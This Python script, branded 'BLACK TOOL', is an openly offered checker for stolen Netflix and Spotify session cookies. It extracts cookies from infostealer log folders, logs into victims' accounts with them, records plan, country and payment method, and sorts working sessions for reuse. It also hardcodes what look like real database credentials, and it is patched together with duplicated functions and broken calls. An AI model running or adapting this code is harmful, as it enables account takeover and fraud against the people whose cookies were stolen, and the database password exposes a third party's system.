import os
from datetime import *
import tkinter as tk
from tkinter import filedialog, Tk
import asyncio
from concurrent.futures import *
import re
import aiohttp
from pystyle import *
import sys
import mysql.connector 
from bs4 import BeautifulSoup
import uuid
import hashlib
import ctypes
import http.cookiejar
from threading import Lock
import subprocess
import json

def show_intro():
     Write.Print(f"""


                $$$$$$$\  $$\        $$$$$$\   $$$$$$\  $$\   $$\       $$$$$$$$\  $$$$$$\   $$$$$$\  $$\       
                $$  __$$\ $$ |      $$  __$$\ $$  __$$\ $$ | $$  |      \__$$  __|$$  __$$\ $$  __$$\ $$ |      
                $$ |  $$ |$$ |      $$ /  $$ |$$ /  \__|$$ |$$  /          $$ |   $$ /  $$ |$$ /  $$ |$$ |      
                $$$$$$$\ |$$ |      $$$$$$$$ |$$ |      $$$$$  /           $$ |   $$ |  $$ |$$ |  $$ |$$ |      
                $$  __$$\ $$ |      $$  __$$ |$$ |      $$  $$<            $$ |   $$ |  $$ |$$ |  $$ |$$ |      
                $$ |  $$ |$$ |      $$ |  $$ |$$ |  $$\ $$ |\$$\           $$ |   $$ |  $$ |$$ |  $$ |$$ |      
                $$$$$$$  |$$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ | \$$\          $$ |    $$$$$$  | $$$$$$  |$$$$$$$$\ 
                \_______/ \________|\__|  \__| \______/ \__|  \__|         \__|    \______/  \______/ \________|
                                                                                                                                                        
                            Discord: https://discord.gg/QJseHtGK3x | Made by BLACK G3N
                                                                                                                                                                                                
    """, Colors.red, interval=0.000)
print("\n\n")
show_intro()


users = {
    "owner": "owner",
    "n3tu": "n3tu",
    "": "",
    # Add more users here as needed
}

def authenticate():
    # Textul de bun venit cu o culoare specifică
    print(f"{Colors.green}Welcome! Please log in.{Colors.reset}\n")
    
    # Cererea pentru numele de utilizator
    username = input(f"{Colors.red}  Enter username: {Colors.reset}")
    
    # Cererea pentru parolă
    password = input(f"{Colors.red}  Enter password: {Colors.reset}")

    # Check if the username exists and the password matches
    if username in users and users[username] == password:
        print("Access granted. Welcome, " + username + "!")
        main_function()  # Continue with the main part of your program
    else:
        print("Access denied. Invalid username or password.")
        exit()  # Terminate the program if authentication fails

def main_function():
    # Your main code here
    print("This is the main part of your application.")

# Run the authentication function when the script is executed
if __name__ == "__main__":
    authenticate()





output_lock = Lock()







db_config = {
    'host': 'mysql.db.bot-hosting.net',
    'user': 'u205258_r1rOZfUfUX',
    'password': 'n!JaBs.@59I4r^V+2C6OWIfi',
    'database': 's205258_idk',  # Numele bazei de date
    'port': 3306,
}


def get_user_mac():
    try:
        output = subprocess.check_output(["wmic", "csproduct", "get", "UUID"]).decode("utf-8")
        lines = output.strip().split("\n")
        if len(lines) >= 2:
            hwid = lines[1].strip()  
            return hwid
        else:
            raise ValueError("UUID not found in output.")
    except Exception as e:
        print(f"Error occurred while retrieving Device info: {e}. Exiting.")
        sys.exit()

def add_mac_to_database(token, user_mac):
    try:
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        query = "SELECT * FROM tokens WHERE code = %s"
        cursor.execute(query, (token,))
        result = cursor.fetchone()

        if result:
            db_mac_address = result[6]
            if db_mac_address is None or db_mac_address.strip() == "":
                update_query = "UPDATE tokens SET mac_address = %s WHERE code = %s"
                cursor.execute(update_query, (user_mac, token))
                conn.commit()
                print("Device saved to the database.")

                if not check_token(token, user_mac):
                    print("MAC address mismatch after updating. Exiting.")
                    sys.exit()
            else:
                print("Saved!! Please reopen the tool")
                sys.exit()
        else:
            print("Token not found in the database. Exiting.")
            sys.exit()

        cursor.close()
        conn.close()

    except Exception as e:
        print(f"An error occurred: {e}")


def check_token(token):
    # Check if the token is "root"
    if token == "root":
        print("Access granted: You have root privileges.")
        return True  # or any other behavior you'd like for root access
    else:
        print("Access denied: Invalid token.")
        return False





valid_count = 0
invalid_count = 0
checked_count = 0
remaining_count = 0

def show_intro():
     Write.Print(f"""


                        $$$$$$$\  $$\        $$$$$$\   $$$$$$\  $$\   $$\       $$$$$$$$\  $$$$$$\   $$$$$$\  $$\       
                        $$  __$$\ $$ |      $$  __$$\ $$  __$$\ $$ | $$  |      \__$$  __|$$  __$$\ $$  __$$\ $$ |      
                        $$ |  $$ |$$ |      $$ /  $$ |$$ /  \__|$$ |$$  /          $$ |   $$ /  $$ |$$ /  $$ |$$ |      
                        $$$$$$$\ |$$ |      $$$$$$$$ |$$ |      $$$$$  /           $$ |   $$ |  $$ |$$ |  $$ |$$ |      
                        $$  __$$\ $$ |      $$  __$$ |$$ |      $$  $$<            $$ |   $$ |  $$ |$$ |  $$ |$$ |      
                        $$ |  $$ |$$ |      $$ |  $$ |$$ |  $$\ $$ |\$$\           $$ |   $$ |  $$ |$$ |  $$ |$$ |      
                        $$$$$$$  |$$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ | \$$\          $$ |    $$$$$$  | $$$$$$  |$$$$$$$$\ 
                        \_______/ \________|\__|  \__| \______/ \__|  \__|         \__|    \______/  \______/ \________|
                                                                                                                                                        
                                    Discord: https://discord.gg/QJseHtGK3x
                                                                                                                                                                                                
    """, Colors.red, interval=0.000)
print("\n\n")
show_intro()


def display_live_counter():
    global valid_count, invalid_count, checked_count, remaining_count

    counter_info = f"VALID: {valid_count};  INVALID: {invalid_count};  CHECKED: {checked_count};  REMAINING: {remaining_count}"

    ctypes.windll.kernel32.SetConsoleTitleW(counter_info)

    return counter_info

# Function to remove duplicate files
remaining_count = 0
total_files = 0

def hash_file(file_path):
    hasher = hashlib.md5()
    with open(file_path, 'rb') as file:
        chunk = file.read(8192)
        while chunk:
            hasher.update(chunk)
            chunk = file.read(8192)
    return hasher.hexdigest()

def remove_duplicates(folder_path):
    global total_files

    file_hashes = set()
    deleted_cookies_count = 0
    total_files = 0  

    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            total_files += 1  # Increment total_files counter

    for filename in os.listdir(folder_path):
        if filename.endswith('.txt'):
            file_path = os.path.join(folder_path, filename)
            file_hash = hash_file(file_path)

            # If the file's hash already exists, it's a duplicate
            if file_hash in file_hashes:
                os.remove(file_path)
                deleted_cookies_count += 1
                total_files -= 1  # Decrement total_files counter for each duplicate removed
            else:
                file_hashes.add(file_hash)

    print(f"Deleted {deleted_cookies_count} duplicate cookies.")
    print(f"Total cookies: {total_files}")

# Function to get number of threads
def get_num_threads():
    while True:
        print("Choose the speed:")
        print("1. Low")
        print("2. Balanced")
        print("3. High")
        print("4. Ultra")
        print("5. Extreme")
        print("6. Custom")
        option = input("Enter your choice (1-6): ")

        if option in ['1', '2', '3', '4', '5', '6']:
            if option == '1':
                return 7
            elif option == '2':
                return 15
            elif option == '3':
                return 30
            elif option == '4':
                return 50
            elif option == '5':
                return 100
            elif option == '6':
                custom_speed = input("Enter the custom speed: ")
                if custom_speed.isdigit():
                    return int(custom_speed)
                else:
                    print("Invalid input. Please enter a valid number.")
        else:
            print("Invalid option. Please choose a number between 1 and 6.")



def select_logs_folder():
    root = tk.Tk()
    root.withdraw()
    root_folder = filedialog.askdirectory(title="Select Logs Folder")
    return root_folder

def find_and_copy_cookies(root_folder):
    print("Searching for cookies, please wait...")

    # Set output paths directly to "Netflix" and "Spotify" folders
    netflix_output_path = "netflix"
    spotify_output_path = "spotify"

    # Ensure output directories exist
    if not os.path.exists(netflix_output_path):
        os.makedirs(netflix_output_path)

    if not os.path.exists(spotify_output_path):
        os.makedirs(spotify_output_path)


    netflix_file_counter = 1
    spotify_file_counter = 1
    total_netflix_cookies = 0
    total_spotify_cookies = 0

    # Walk through the root folder to find and process cookies
    for folder_path, _, _ in os.walk(root_folder):
        cookies_folder = os.path.join(folder_path, 'spotify2')

        if os.path.exists(cookies_folder) and os.path.isdir(cookies_folder):
            for filename in os.listdir(cookies_folder):
                file_path = os.path.join(cookies_folder, filename)
                if filename.endswith('.txt'):
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                        lines = file.readlines()
                        netflix_cookies, spotify_cookies = extract_cookies(lines)

                        if netflix_cookies:
                            netflix_result_file = os.path.join(netflix_output_path, f'netflix_cookies_{netflix_file_counter}.txt')
                            with open(netflix_result_file, 'w', encoding='utf-8') as result:
                                result.write('\n'.join(netflix_cookies))
                            netflix_file_counter += 1
                            total_netflix_cookies += 1

                        if spotify_cookies:
                            spotify_result_file = os.path.join(spotify_output_path, f'spotify_cookies_{spotify_file_counter}.txt')
                            with open(spotify_result_file, 'w', encoding='utf-8') as result:
                                result.write('\n'.join(spotify_cookies))
                            spotify_file_counter += 1
                            total_spotify_cookies += 1

    print(f"{total_netflix_cookies} Netflix cookies extracted.")
    print(f"{total_spotify_cookies} Spotify cookies extracted.")

def extract_cookies(lines):
    netflix_cookies = []
    spotify_cookies = []

    for line in lines:
        if not line.startswith('#'):
            cookie = parse_cookie_line(line)

            if cookie:
                if '.netflix.com' in cookie.domain:
                    netflix_cookies.append(line.strip())
                elif '.spotify.com' in cookie.domain:
                    spotify_cookies.append(line.strip())

    return netflix_cookies, spotify_cookies

# Placeholder for the parse_cookie_line function
def parse_cookie_line(line):
    # Dummy implementation; replace with actual parsing logic
    class Cookie:
        domain = ''
    cookie = Cookie()
    if 'netflix.com' in line:
        cookie.domain = '.netflix.com'
    elif 'spotify.com' in line:
        cookie.domain = '.spotify.com'
    return cookie



def parse_cookie_line(line):
    parts = line.strip().split('\t')

    if len(parts) >= 7:
        return http.cookiejar.Cookie(
            version=0,
            name=parts[5],
            value=parts[6],
            port=None,
            port_specified=False,
            domain=parts[0],
            domain_specified=bool(parts[1]),
            domain_initial_dot=parts[0].startswith('.'),
            path=parts[2],
            path_specified=bool(parts[3]),
            secure=bool(parts[4]),
            expires=int(parts[4]) if parts[4].isdigit() else None,
            discard=False,
            comment=None,
            comment_url=None,
            rest={},
            rfc2109=False,
        )
    else:
        return None

async def check_netflix(path):
    cookies = {}
    l = []
    async with aiohttp.ClientSession(trust_env=True) as session:
        try:
            with open(path, 'r', encoding='utf-8') as file:
                for line in file:
                    if any(keyword in line for keyword in ["NetflixId", "SecureNetflixId"]):
                        l.append(line)
                        cookie_parts = re.split(r'\t', line.strip())
                        name, value = cookie_parts[5], cookie_parts[6]
                        cookies[name] = value
            url = "https://www.netflix.com/YourAccount"

            async with session.get(url, cookies=cookies) as response:
                if response.url.path == '/account':
                    html = await response.text()

                    # Parse the HTML using BeautifulSoup
                    soup = BeautifulSoup(html, 'lxml')

                    # Find the plan information
                    plan_tag = soup.find('h3', {'data-uia': 'account-overview-page+membership-card+title'})
                    if plan_tag:
                        plan_text = plan_tag.get_text(separator=" ", strip=True)
                        plan_parts = plan_text.split(' ', 1)
                        plan = plan_parts[0]
                        if len(plan_parts) > 1:
                            plan += ' ' + plan_parts[1]
                    else:
                        plan = "Free"

                    extra = "manage-extra-members" in html

                    country_match = re.search(r'"currentCountry":"(.*?)"', html)
                    country_text = country_match.group(1) if country_match else "Country not found"

                    payment_method = "Third party"
                    if "VISA.png" in html:
                        payment_method = "Visa"
                    elif "MASTERCARD.png" in html:
                        payment_method = "Mastercard"
                    elif "PAYPAL.png" in html:
                        payment_method = "Paypal"
                    elif "Xfinity" in html:
                        payment_method = "Xfinity"
                    elif "T-Mobile" in html:
                        payment_method = "T-Mobile"
                    
                    lines = l
                    return {
                        "plan": plan,
                        "extra": extra,
                        "country": country_text,
                        "payment_method": payment_method,
                        "lines": lines
                    }
                else:
                    return False
        except Exception as e:
            print(f"Error checking Netflix: {e}")
            return False
        
output_folder = None
def sanitize_filename(filename):
    return re.sub(r'[^\w\-_\. ]', '_', filename)
def process_netflix_file(file_path):
    global valid_count, invalid_count, checked_count, remaining_count, output_folder, total_files

    result = asyncio.run(check_netflix(file_path))

    if result:
        try:
            if result["plan"] == "Free":
                invalid_count += 1
                checked_count += 1
                remaining_count = total_files - checked_count
                with output_lock:
                    print(f"{Colors.yellow}[L] Free | {Colors.white}{os.path.basename(file_path)}")
                sys.stdout.flush()
                os.remove(file_path)
                display_live_counter()
                return

            valid_count += 1
            checked_count += 1
            remaining_count = total_files - checked_count

            if output_folder is None:
                output_folder = os.path.join("netflix", datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
                os.makedirs(output_folder, exist_ok=True)

            output_file_name = f"ExtraMember-{result['country']}-{result['plan']}-{result['payment_method']}_{uuid.uuid4()}.txt" if result['extra'] \
                else f"{result['country']}_{result['plan']}-{result['payment_method']}_{uuid.uuid4()}.txt"
            output_file_name = sanitize_filename(output_file_name)
            output_file_path = os.path.join(output_folder, output_file_name)

            with open(output_file_path, 'w', encoding='utf-8') as output_file:
                for line in result['lines']:
                    output_file.write(line)

                formatted_output = f"""
୧‿̩͙ ˖︵ ꕀ⠀ ♱⠀ ꕀ ︵˖ ‿̩͙୨
BLACK TOOL | https://discord.gg/QJseHtGK3x
Plan: {result['plan']}
ExtraMember: {result['extra']}
Country: {result['country']}
Payment Method: {result['payment_method']}
୧‿̩͙ ˖︵ ꕀ⠀ ♱⠀ ꕀ ︵˖ ‿̩͙୨
"""
                output_file.write(formatted_output)

            if os.path.exists(output_file_path):
                with output_lock:
                    print(f"{Colors.green}[W] Valid | {Colors.white}{os.path.basename(file_path)}")
                sys.stdout.flush()
                os.remove(file_path)
            else:
                with output_lock:
                    print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
                    os.remove(file_path)
                sys.stdout.flush()

            display_live_counter()
        except Exception as e:
            print(f"Error processing file {file_path}: {e}")
            invalid_count += 1
            checked_count += 1
            remaining_count = total_files - checked_count
            with output_lock:
                print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
                os.remove(file_path)
            sys.stdout.flush()
            display_live_counter()
    else:
        invalid_count += 1
        checked_count += 1
        remaining_count = total_files - checked_count
        with output_lock:
            print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
            os.remove(file_path)
        sys.stdout.flush()
        display_live_counter()

# Function to check Spotify cookies
async def check_spotify(path):
    cookies = {}
    lines = []
    async with aiohttp.ClientSession(trust_env=True) as session:
        try:
            with open(path, 'r', encoding='utf-8') as file:
                for line in file:
                    if any(keyword in line for keyword in ["sp_dc", "sp_key"]):
                        lines.append(line)
                        cookie_parts = re.split(r'\t', line.strip())
                        name, value = cookie_parts[5], cookie_parts[6]
                        cookies[name] = value
        except FileNotFoundError:
            return {"error": "File not found"}

        url = "https://www.spotify.com/account/overview/"
        await asyncio.sleep(0.8)
        async with session.get(url, cookies=cookies) as response:
            if not str(response.url).count("login"):
                result = {}
                html = await response.text()
                if "Spotify Free" in html:
                    result["plan"] = "Free" 
                elif "Premium Family" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Member"
                elif "Premium Individual" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Payment Pending"
                    result["plan"] = "Premium Individual"
                elif "Premium Duo" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Member"
                    result["plan"] = "Premium Duo"
                elif "Premium Student" in html:
                    result['plan'] = "Premium Family"
                    result["sub"] = "Owner" if "Your next bill is for" in html else "Payment Pending"
                    result["plan"] = "Premium Student"
                else:
                    result["plan"] = "Unknown"

                result["lines"] = lines
                return result
            else:
                return None

output_folder = None
def process_spotify_file(file_path):
    global valid_count, invalid_count, checked_count, remaining_count, output_folder, total_files

    result = asyncio.run(check_spotify(file_path))

    if result:
        if result['plan'] == "Free":
            checked_count += 1
            invalid_count += 1
            remaining_count = total_files - checked_count
            with output_lock:
                print(f"{Colors.yellow}[L] Free | {Colors.white}{os.path.basename(file_path)}")
            sys.stdout.flush()
            display_live_counter()
        else:
            checked_count += 1
            remaining_count = total_files - checked_count

            if output_folder is None:
                output_folder = os.path.join("spotify_outpatch", datetime.now().strftime("Spotify | %Y-%m-%d_%H-%M-%S"))
                os.makedirs(output_folder, exist_ok=True)

            output_file_path = os.path.join(output_folder, f"{result['plan']}-{result['sub'] if result['sub'] else 'OWNER'}_{uuid.uuid4()}.txt")

            with open(output_file_path, 'w', encoding='utf-8') as output_file:
                output_file.write(''.join(result['lines']))

                formatted_output = f"""
୧‿̩͙ ˖︵ ꕀ⠀ ♱⠀ ꕀ ︵˖ ‿̩͙୨
BLACK TOOL | https://discord.gg/QJseHtGK3x
 Plan: {result['plan']}
 status: {result['sub'] if result['sub'] else 'OWNER'}
୧‿̩͙ ˖︵ ꕀ⠀ ♱⠀ ꕀ ︵˖ ‿̩͙୨
                         """
                output_file.write(formatted_output)

            valid_count += 1
            with output_lock:
                print(f"{Colors.green}[W] Valid | {Colors.white}{os.path.basename(file_path)}")
            sys.stdout.flush()
            display_live_counter()
    else:
        invalid_count += 1
        checked_count += 1
        remaining_count = total_files - checked_count
        with output_lock:
            print(f"{Colors.red}[L] Invalid | {Colors.white}{os.path.basename(file_path)}")
        sys.stdout.flush()
        display_live_counter()

        
# Function to start Spotify cookie checking automatically
def start_spotify_checker():
    cookies_folder = "cookies"
    if not os.path.exists(cookies_folder):
        os.makedirs(cookies_folder)
    
    print("SPOTIFY CHECKER | Place your Spotify cookies in the 'cookies' folder")
    for file_name in os.listdir(cookies_folder):
        file_path = os.path.join(cookies_folder, file_name)
        if file_name.endswith('.txt'):
            process_spotify_file(file_path)

# Example call to start the Spotify checker
if __name__ == "__main__":
    start_spotify_checker()


def get_match(text, pattern):
    match = re.search(pattern, text)
    return match.group(1) if match else "Not found"

output_folder = None

def json_to_netscape(json_data):
    netscape_cookies = ""
    for cookie in json_data:
        try:
            host_only = cookie.get('hostOnly', False)  
            netscape_cookies += "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                cookie['domain'],
                'TRUE' if host_only else 'FALSE',
                cookie['path'],
                'TRUE' if cookie['secure'] else 'FALSE',
                str(cookie.get('expirationDate', '')),
                cookie['name'],
                cookie['value']
            )
        except KeyError:
            print("Skipping invalid cookie:", cookie)
    return netscape_cookies

def convert_folder_to_netscape(folder_path):
    for file_name in os.listdir(folder_path):
        if file_name.endswith('.json') or ('.txt'):
            file_path = os.path.join(folder_path, file_name)
            try:
                with open(file_path, 'r') as file:
                    json_data = extract_json_from_brackets(file)
                    if json_data:
                        netscape_cookies = json_to_netscape(json_data)
                        save_netscape_cookie(netscape_cookies, folder_path, file_name)
            except json.JSONDecodeError as e:
                print(f"Error reading {file_name}: {str(e)}")

def extract_json_from_brackets(file):
    json_string = ""
    inside_brackets = False
    for line in file:
        if "[" in line:
            inside_brackets = True
        if inside_brackets:
            json_string += line
        if "]" in line:
            inside_brackets = False
            try:
                return json.loads(json_string)
            except json.JSONDecodeError as e:
                print(f"Error decoding JSON: {str(e)}")
    return None

def save_netscape_cookie(netscape_cookies, folder_path, file_name):
    netscape_folder = os.path.join(folder_path, "netscape")
    if not os.path.exists(netscape_folder):
        os.makedirs(netscape_folder)
    file_name = os.path.splitext(file_name)[0] + ".txt"
    file_path = os.path.join(netscape_folder, file_name)
    with open(file_path, 'w') as file:
        file.write(netscape_cookies)


def clear_screen():
    if os.name == 'nt':
        os.system('cls')


def select_logs_folder():
    root = tk.Tk()
    root.withdraw()
    root_folder = filedialog.askdirectory(title="Select Logs Folder")
    return root_folder

def main():
    global remaining_count, output_folder, valid_count, invalid_count, checked_count, total_files, current_datetime,file_path

    files_to_process = []  

    while True:
        clear_screen()
        clear_screen()
        show_intro()
        print(f"{Colors.white}Choose an option\n")
        print(f"{Colors.red}1. Netflix Checker")
        print(f"{Colors.green}2. Spotify Checker")
        print(f"{Colors.blue}3. Logs extractor")
        print(f"{Colors.black}--------------------------")
        print(f"{Colors.white}4. Exit")
        try:
            choice = int(input("Enter your option: "))
        except ValueError:
            print("Invalid input. Please enter a valid integer.")
            continue

        if choice not in [1, 2, 3, 4]:
            print("Invalid choice. Please enter a valid option.")
            continue

        if choice == 1:
            
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder")  
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_netflix_file, files_to_process)

            
            valid_count = 0
            invalid_count = 0
            checked_count = 0
            remaining_count = 0

            input("Netflix Checker finished. Press Enter to continue...")
            continue

        elif choice == 2:
            output_folder = None
            root = tk.Tk()
            root.withdraw()  
            folder_path = filedialog.askdirectory(title="Select Folder")  
            remove_duplicates(folder_path)

            num_threads = get_num_threads()

            files_to_process = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if file.endswith(".txt")]
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                executor.map(process_spotify_file, files_to_process)

            valid_count = 0
            invalid_count = 0
            checked_count = 0
            remaining_count = 0

            input("Spotify Checker finished. Press Enter to continue...")
            continue

        elif choice == 3:
            
            root_folder = select_logs_folder()
            if root_folder:
                find_and_copy_cookies(root_folder)

            input("Logs extraction finished. Press Enter to continue...")
            continue

        elif choice == 4:
            print("Bye, i hope you enjoy our tool, more soon! Maybe")
            sys.exit()
if __name__ == "__main__":
    main()
